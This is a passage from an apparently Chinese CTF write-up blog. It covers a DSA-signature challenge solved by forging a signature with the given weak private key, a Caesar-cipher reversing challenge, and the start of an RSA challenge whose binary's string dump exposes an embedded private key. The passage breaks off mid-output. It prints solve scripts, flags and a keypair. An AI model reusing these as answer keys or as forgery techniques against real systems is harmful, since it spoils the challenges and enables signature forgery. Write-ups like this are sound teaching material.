class="number">7144062426562178459134763982605952302933077316845461785177531950627385795442407387260745982564084210402482982761274236868248912040071369181916889827118820</span></span><br><span class="line">y = <span class="number">8291891676739439066670566927114794141859628227389282017383200710395666779939972786268373568231932748094932532880440197180527838969047845790921891292250679</span></span><br><span class="line">FLAG = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;uuid&#123;xixixixi&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):  </span><br><span class="line">    a = a % m</span><br><span class="line">    lm, hm = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    low, high = a % m, m</span><br><span class="line">    <span class="keyword">while</span> low &gt; <span class="number">1</span>:</span><br><span class="line">        r = high // low</span><br><span class="line">        nm, new = hm - lm * r, high - low * r</span><br><span class="line">        lm, low, hm, high = nm, new, lm, low</span><br><span class="line">    <span class="keyword">return</span> lm % m</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">msg: <span class="built_in">str</span>, r: <span class="built_in">int</span>, s: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt; r &lt; q <span class="keyword">and</span> <span class="number">0</span> &lt; s &lt; q):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    hm = <span class="built_in">int</span>.from_bytes(sha1(msg.encode()).digest(), <span class="string">&#x27;big&#x27;</span>) % q</span><br><span class="line">    w = modinv(s, q)</span><br><span class="line">    u1 = (hm * w) % q</span><br><span class="line">    u2 = (r * w) % q</span><br><span class="line">    v = ((<span class="built_in">pow</span>(g, u1, p) * <span class="built_in">pow</span>(y, u2, p)) % p) % q</span><br><span class="line">    <span class="keyword">return</span> v == r</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Handler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.request.sendall(<span class="string">b&quot;Send me JSON lines like &#123;\&quot;msg\&quot;:\&quot;...\&quot;,\&quot;r\&quot;:\&quot;...\&quot;,\&quot;s\&quot;:\&quot;...\&quot;&#125;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            line = <span class="variable language_">self</span>.request.recv(<span class="number">4096</span>).strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = json.loads(line.decode())</span><br><span class="line">                msg = data[<span class="string">&#x27;msg&#x27;</span>]</span><br><span class="line">                r = <span class="built_in">int</span>(data[<span class="string">&#x27;r&#x27;</span>])</span><br><span class="line">                s = <span class="built_in">int</span>(data[<span class="string">&#x27;s&#x27;</span>])</span><br><span class="line">                ok = verify(msg, r, s)</span><br><span class="line">                <span class="variable language_">self</span>.request.sendall(<span class="string">f&quot;MSG=<span class="subst">&#123;msg&#125;</span> OK=<span class="subst">&#123;ok&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">                <span class="keyword">if</span> ok <span class="keyword">and</span> msg == <span class="string">&quot;give_me_flag&quot;</span>:</span><br><span class="line">                    <span class="variable language_">self</span>.request.sendall(<span class="string">f&quot;FLAG: <span class="subst">&#123;FLAG&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="variable language_">self</span>.request.sendall(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>\n&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    server = socketserver.ThreadingTCPServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">12345</span>), Handler)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p = 8576266215257684451627938266209288368747290850430257232775662794860889167273173590976498454387838065099555150702527005228232224203671818388040396426167421</span><br><span class="line">q = 1092510234019</span><br><span class="line">g = 7144062426562178459134763982605952302933077316845461785177531950627385795442407387260745982564084210402482982761274236868248912040071369181916889827118820</span><br><span class="line">x = 379478523492</span><br><span class="line">y = 8291891676739439066670566927114794141859628227389282017383200710395666779939972786268373568231932748094932532880440197180527838969047845790921891292250679</span><br><span class="line"></span><br><span class="line">P_bits= 512</span><br><span class="line">NUM_SAMPLES:= 700</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目提供的参数</span></span><br><span class="line">p = <span class="number">8576266215257684451627938266209288368747290850430257232775662794860889167273173590976498454387838065099555150702527005228232224203671818388040396426167421</span></span><br><span class="line">q = <span class="number">1092510234019</span></span><br><span class="line">g = <span class="number">7144062426562178459134763982605952302933077316845461785177531950627385795442407387260745982564084210402482982761274236868248912040071369181916889827118820</span></span><br><span class="line">x = <span class="number">379478523492</span>  <span class="comment"># 已知的私钥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a, -<span class="number">1</span>, m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_message</span>(<span class="params">msg, x, p, q, g</span>):</span><br><span class="line">    <span class="comment"># 我们可以随便选一个 k，只要满足 1 &lt;= k &lt; q</span></span><br><span class="line">    k = <span class="number">123456789</span> </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 1. 计算 r</span></span><br><span class="line">    r = <span class="built_in">pow</span>(g, k, p) % q</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 计算消息的哈希值</span></span><br><span class="line">    hm = <span class="built_in">int</span>.from_bytes(sha1(msg.encode()).digest(), <span class="string">&#x27;big&#x27;</span>) % q</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 计算 s = k^-1 * (hm + x*r) mod q</span></span><br><span class="line">    k_inv = modinv(k, q)</span><br><span class="line">    s = (k_inv * (hm + x * r)) % q</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标消息</span></span><br><span class="line">target_msg = <span class="string">&quot;give_me_flag&quot;</span></span><br><span class="line">r, s = sign_message(target_msg, x, p, q, g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造发送给服务器的 JSON</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;msg&quot;</span>: target_msg,</span><br><span class="line">    <span class="string">&quot;r&quot;</span>: <span class="built_in">str</span>(r),</span><br><span class="line">    <span class="string">&quot;s&quot;</span>: <span class="built_in">str</span>(s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(json.dumps(payload))</span><br></pre></td></tr></table></figure>
<p>nc，发送 {“msg”: “give_me_flag”, “r”: “390893041773”, “s”: “814033672429”}</p>
<p><strong>CBCTF{cd1fa9af-2c4a-4b79-a602-650a7f496f7f}</strong></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><strong>Reverse</strong></h2><ul>
<li>Welcome</li>
</ul>
<blockquote>
<p>入门第一课，找到加密后的flag吧</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">112</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">104</span>]; <span class="comment">// [rsp+90h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *iodj_Qrz_BrX_ILQg_Phhhhh_; <span class="comment">// [rsp+F8h] [rbp+78h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  iodj_Qrz_BrX_ILQg_Phhhhh_ = <span class="string">&quot;iodj&#123;Qrz-BrX-ILQg-Phhhhh&#125;&quot;</span>;</span><br><span class="line">  puts_0(<span class="string">&quot;Welcome To The CTF World&quot;</span>);</span><br><span class="line">  puts_0(<span class="string">&quot;This is your flag, but it needs to be decrypted.&quot;</span>);</span><br><span class="line">  printf_0(&amp;Format);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%99s&quot;</span>, v4);</span><br><span class="line">  caesarEncrypt(v4, v5);</span><br><span class="line">  compareFlags(v5, iodj_Qrz_BrX_ILQg_Phhhhh_);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_bruteforce</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;暴力破解凯撒密码&quot;&quot;&quot;</span></span><br><span class="line">    results = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历所有可能的偏移量（1-25）</span></span><br><span class="line">    <span class="keyword">for</span> shift <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">        decrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">            <span class="keyword">if</span> char.isalpha():</span><br><span class="line">                <span class="comment"># 处理大写字母</span></span><br><span class="line">                <span class="keyword">if</span> char.isupper():</span><br><span class="line">                    base = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">                    decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - base - shift) % <span class="number">26</span> + base)</span><br><span class="line">                <span class="comment"># 处理小写字母</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    base = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                    decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - base - shift) % <span class="number">26</span> + base)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 非字母字符保持不变</span></span><br><span class="line">                decrypted_char = char</span><br><span class="line">            </span><br><span class="line">            decrypted += decrypted_char</span><br><span class="line">        </span><br><span class="line">        results.append(<span class="string">f&quot;Shift <span class="subst">&#123;shift:2d&#125;</span>: <span class="subst">&#123;decrypted&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;iodj&#123;Qrz-BrX-ILQg-Phhhhh&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">decryptions = caesar_bruteforce(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出所有结果</span></span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> decryptions:</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;最有可能的结果（常见flag格式）:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找包含 &quot;flag&#123;&quot; 的结果</span></span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> decryptions:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> result.lower():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  ==&gt; <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>flag{Now-YoU-FINd-Meeeee}得到<strong>CBCTF{Now-YoU-FINd-Meeeee}</strong></p>
<ul>
<li>Lost_key</li>
</ul>
<blockquote>
<p>大嗨客的SkipShot搓了一个RSA加解密工具，把价值1000分的机密数据给加密了，为了不让别人知道，他把私钥给藏起来了。。。在严刑拷打(并非严刑)之下，他把他的工具交出来了，你能把这个机密数据还原出来吗？</p>
<p>试试bindiff工具~</p>
</blockquote>
<p>非预期了哈，不会装插件555</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(root㉿LAPTOP-BMERJF8L)-[/mnt/e/1215]</span><br><span class="line">└─# strings encryption_tool_old</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">EVP_PKEY_CTX_free</span><br><span class="line">ERR_get_error</span><br><span class="line">PEM_read_bio_PrivateKey</span><br><span class="line">PEM_read_bio_PUBKEY</span><br><span class="line">BIO_free</span><br><span class="line">BIO_new_mem_buf</span><br><span class="line">EVP_PKEY_decrypt_init</span><br><span class="line">EVP_PKEY_encrypt</span><br><span class="line">EVP_PKEY_decrypt</span><br><span class="line">EVP_PKEY_encrypt_init</span><br><span class="line">EVP_PKEY_free</span><br><span class="line">EVP_PKEY_CTX_new</span><br><span class="line">EVP_PKEY_CTX_set_rsa_padding</span><br><span class="line">ERR_error_string</span><br><span class="line">strcpy</span><br><span class="line"><span class="built_in">sleep</span></span><br><span class="line">puts</span><br><span class="line">__stack_chk_fail</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">dlclose</span><br><span class="line">strlen</span><br><span class="line">malloc</span><br><span class="line">__libc_start_main</span><br><span class="line">dlopen</span><br><span class="line">__cxa_finalize</span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">__isoc99_scanf</span><br><span class="line">memcpy</span><br><span class="line">strcmp</span><br><span class="line">libcrypto.so.3</span><br><span class="line">libc.so.6</span><br><span class="line">OPENSSL_3.0.0</span><br><span class="line">GLIBC_2.14</span><br><span class="line">GLIBC_2.7</span><br><span class="line">GLIBC_2.4</span><br><span class="line">GLIBC_2.34</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">PTE1</span><br><span class="line">u+UH</span><br><span class="line">&lt;=t2</span><br><span class="line">&lt;=t+</span><br><span class="line">[S]Version Checking...</span><br><span class="line">[S]version: 19.198.10</span><br><span class="line">[S]Welcome to the RSA encryption program!!!</span><br><span class="line">[S]Tell me your ciphertext or plaintext:</span><br><span class="line">[S]Ciphertext checking...</span><br><span class="line">[S]Right ciphertext!</span><br><span class="line">[S]Not ciphtertext</span><br><span class="line">[S]Environment checking...</span><br><span class="line">libcrypto.so</span><br><span class="line">[S]No OpenSSL <span class="keyword">in</span> your <span class="built_in">env</span>!! <span class="built_in">exit</span></span><br><span class="line">[S]OpenSSL <span class="built_in">env</span> work</span><br><span class="line">[S]Encrypting your plaintext...</span><br><span class="line">[S]Decrypting your ciphertext...</span><br><span class="line">[S]Error: NULL input</span><br><span class="line">[S]Failed to get private key!</span><br><span class="line">[S]BIO creation failed!</span><br><span class="line">[S]Load private key error: %s</span><br><span class="line">[S]EVP_PKEY_CTX_new error: %s</span><br><span class="line">[S]EVP_PKEY_decrypt_init error: %s</span><br><span class="line">[S]Set padding error: %s</span><br><span class="line">[S]Get output length error: %s</span><br><span class="line">[S]Malloc error!</span><br><span class="line">[S]Decrypt error: %s</span><br><span class="line">[S]Invalid input parameters!</span><br><span class="line">[S]Failed to get public key!</span><br><span class="line">[S]Load public key error: %s</span><br><span class="line">[S]EVP_PKEY_encrypt_init error: %s</span><br><span class="line">[S]Encrypt error: %s</span><br><span class="line">[S]Warning! This version has deprecated, please updata!!</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><br><span class="line">?456789:;&lt;=</span><br><span class="line"> !<span class="string">&quot;#$%&amp;&#x27;()*+,-./0123</span></span><br><span class="line"><span class="string">9*3$&quot;</span></span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCPsj+c/7xPr54hxUnTWHc9fxqQ</span><br><span class="line">rHkZgoM3VGXTlu7C1UxLFZiWjZ0r8u6SgtFUm4qnKzgpaNRgSL22umNbdIaQCUls</span><br><span class="line">mxozADlYtQ4FOCZUGuDMQe/f8TcVPIuHjIgmNfIPu1+yy4NZDnZfOf6Y7B6jKEJ4</span><br><span class="line">ROfzXCKTuRWS+6pRwQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLVxuTUlJQ2RnSUJBREFOQmdrcWhraUc5dzBCQVFFRkFBU0NBbUF3Z2dKY0FnRUFBb0dCQUkreVA1ei92RSt2bmlIRlxuU2ROWWR6MS9HcENzZVJtQ2d6ZFVaZE9XN3NMVlRFc1ZtSmFOblN2eTdwS0MwVlNiaXFjck9DbG8xR0JJdmJhNlxuWTF0MGhwQUpTV3liR2pNQU9WaTFEZ1U0SmxRYTRNeEI3OS94TnhVOGk0ZU1pQ1kxOGcrN1g3TExnMWtPZGw4NVxuL3Bqc0hxTW9RbmhFNS9OY0lwTzVGWkw3cWxIQkFnTUJBQUVDZ1lCckFlNWxWL3cveXlRVE9mdjBLeGtBN3JvMVxucW5xMENJRDJueDhGSm95L0FtQkNPZDdibnJIQW5MUVUzdDVNQjFpRmpLWFNFSUszQVBSbU12N3lpQi83MjROcFxucVVVU2ZYVmZtekk1aituYzh2UEhEZmpDck9WTXVSZkpUcW44WS91bnY4TVcyemtzN0RiRXdrQnk5OUdTVVYvS1xuL3BGQzJGa2hhbURmUmtoZkFRSkJBTmZ2bmJ3WGk2R1g3U1BmZGxhaWtmUDl6VGlIM1JMc3NHcXlwMEEvVFVzeVxuTGhEcjNmbXVQbFFUeElkSHcxSHplUzNueWQrcjJzejJGc0s4Y09SQlNxa0NRUUNxVzNCQ25qYjZOa0tXSlJ5L1xuekwvM0s0cUQ0T2ZMQWlVTEQrWW8rY3JrQ1B2YXNpZWZmeWx0MkVsZDhPZmxvenRyWDJFVjlyNU94ODdMVXNSWlxuUzVWWkFrRUF1Y0wyQkFpUlkzdHFVeEQ3SWI2TEpzWXhGSyswbklJbnBqSjR0VWwvdWUrNk4yNWhzRmlZWUFYOVxuYkk5czFRUktQQmFKMFRScmJ5VkpJVSt4SW51VXVRSkFmUmYvNnlzNnU2azBaQVNFZytMWjQ2bzVZSFc2UDd3blxuYjJRUlltMXFxdUJkOEUxNkF3amhaeU8zWENBV2FPM2dLQXcxd21jWmY4Z0E5aFNrMGQxS29RSkFhNzVGS1dtTFxuSmhVbFdzK2tHK0tkaEVRTmtWdTBsZnh2N0Jxd2YxL0F6ZGR3QmNiTzFYckQzVmVVRmo3R21STFRMS244cXF0ZVxubHk1MnpEdm01RGx3V0E9PVxuLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0=</span><br><span class="line">The ciphertext was moved///////</span><br><span class="line">GCC: (Ubuntu 14.2.0-4ubuntu2~24.04) 14.2.0</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.gnu.property</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.plt.sec</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.dynamic</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br><span class="line"></span><br><span class="line">(base) ┌──(root㉿LAPTOP-BMERJF8L)-[/mnt/e/1215]</span><br><span class="line">└─# strings encryption_tool_new</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">EVP_PKEY_CTX_free</span><br><span class="line">ERR_get_error</span><br><span class="line">PEM_read_bio_PrivateKey</span><br><span class="line">PEM_read_bio_PUBKEY</span><br><span class="line">BIO_free</span><br><span class="line">BIO_new_mem_buf</span><br><span class="line">EVP_PKEY_decrypt_init</span><br><span class="line">EVP_PKEY_encrypt</span><br><span class="line">EVP_PKEY_decrypt</span><br><span class="line">EVP_PKEY_encrypt_init</span><br><span class="line">EVP_PKEY_free</span><br><span class="line">EVP_PKEY_CTX_new</span><br><span class="line">EVP_PKEY_CTX_set_rsa_padding</span><br><span class="line">ERR_error_string</span><br><span class="line">strcpy</span><br><span class="line"><span class="built_in">sleep</span></span><br><span class="line">puts</span><br><span class="line">__stack_chk_fail</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">dlclose</span><br><span class="line">strlen</span><br><span class="line">malloc</span><br><span class="line">__libc_start_main</span><br><span class="line">dlopen</span><br><span class="line">__cxa_finalize</span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">__isoc99_scanf</span><br><span class="line">memcpy</span><br><span class="line">strcmp</span><br><span class="line">libcrypto.so.3</span><br><span class="line">libc.so.6</span><br><span class="line">OPENSSL_3.0.0</span><br><span class="line">GLIBC_2.14</span><br><span class="line">GLIBC_2.7</span><br><span 